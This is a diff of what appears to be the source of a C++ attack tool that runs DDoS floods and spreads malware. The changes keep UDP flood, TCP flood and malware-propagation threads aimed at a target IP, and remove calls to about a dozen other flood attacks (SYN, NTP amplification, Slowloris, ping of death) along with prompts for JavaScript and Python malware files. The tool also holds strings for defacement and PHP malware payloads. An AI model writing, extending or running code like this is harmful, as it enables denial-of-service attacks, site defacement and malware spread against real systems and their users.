@@ -25,7 +25,7 @@ string defaceHTML;
 string malwarePHP;
 string malwarePayload;
 string malwareJS;
-string malwarePython; 
+string malwarePython;
 
 bool attackRunning = false;
 
@@ -93,20 +93,6 @@ void startAttack() {
         thread(udpFlood, ip, targetPort).detach();
         thread(tcpFlood, ip, targetPort).detach();
         thread(propagateMalware, ip).detach();
-        thread(synFlood, ip, targetPort).detach();
-        thread(httpFlood, ip, targetPort).detach();
-        thread(icmpFlood, ip, targetPort).detach();
-        thread(ackFlood, ip, targetPort).detach();
-        thread(volumetricAttack, ip, targetPort).detach();
-        thread(smurfAttack, ip, targetPort).detach();
-        thread(sslTlsAttack, ip, targetPort).detach();
-        thread(httpGetRequest, ip, targetPort).detach();
-        thread(protocolAttack, ip, targetPort).detach();
-        thread(ipNullAttack, ip, targetPort).detach();
-        thread(ntpAmplificationAttack, ip, targetPort).detach();
-        thread(pingOfDeath, ip, targetPort).detach();
-        thread(slowlorisAttack, ip, targetPort).detach();
-        thread(hulkFlood, ip, targetPort).detach();
     }
 }
 
@@ -445,12 +431,6 @@ int main() {
 
     cout << "Enter the path to the PHP file for the malware: ";
     getline(cin, malwarePHP);
-
-    cout << "Enter the path to the JavaScript file for the malware: ";
-    getline(cin, malwareJS);
-
-    cout << "Enter the path to the Python malware file: ";
-    getline(cin, malwarePython);
 
     malwarePayload = generateMalwarePayload();
 
